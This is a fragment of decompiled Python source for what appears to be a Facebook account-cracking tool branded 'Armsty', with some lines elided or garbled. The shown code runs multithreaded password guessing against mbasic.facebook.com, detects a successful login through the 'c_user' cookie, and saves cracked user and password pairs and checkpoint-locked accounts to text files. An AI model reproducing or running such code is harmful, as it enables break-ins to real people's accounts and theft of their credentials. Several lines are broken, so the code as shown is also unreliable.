...
# Time Succes decompile : 2022-06-01 12:00:05.364289
...
from concurrent.futures import ThreadPoolExecutor as Armstyabba
from datetime import datetime
from bs4 import BeautifulSoup
...
from concurrent.futures import ThreadPoolExecutor as ArmstyMahar
...
class __crack__:
	...
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write(f"\r \x1b[1;92m[Armsty] {loop}/{len(self.id)} [OK-{len(ok)}] [CP-{len(cp)}] ")
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			if 'c_user' in ses.cookies.get_dict():
				print('\r\033[1;32m[Armsty-OK] %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('Armsty_Ok.txt','a').write('%s\n' % wrt)
				break
				...
				try:
					...
					month = bulan_ttl[month].print('\r\033[1;91m[Armsty-CP] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
					...
					pass
				print('\r\033[1;91m[RAKIB-CP] %s | %s%s      ' % (user,pw,tahun(user)))
				wrt = '%s - %s%s'%(user,pw,tahun(user))
				cp.append(wrt)
				open('Armsty_Cp.txt','a').write('%s\n' % wrt)
				break
			else:
				continue
		loop += 1
...
class __xxx__:
    ...
    def __pler__(self):
            ...
            print(54*"_")
            print("")
            with Armstyabba(max_workers=30) as Armsty:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        ...
                        Armsty.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
...
banner = """ \033[1;32m#######     ###    ########  #### ########  \n\033[1;33m##     ##   ## ##   ##     ##  ##  ##     ## \n\033[1;37m##     ##  ##   ##  ##     ##  ##  ##     ## \n\033[1;32m##     ## ##     ## ##     ##  ##  ########  \n\033[1;33m##  ## ## ######### ##     ##  ##  ##   ##   \n\033[1;37m##    ##  ##     ## ##     ##  ##  ##    ##  \n\033[1;32m ##### ## ##     ## ########  #### ##     ## \n
\033[1;33m__________________________________________________
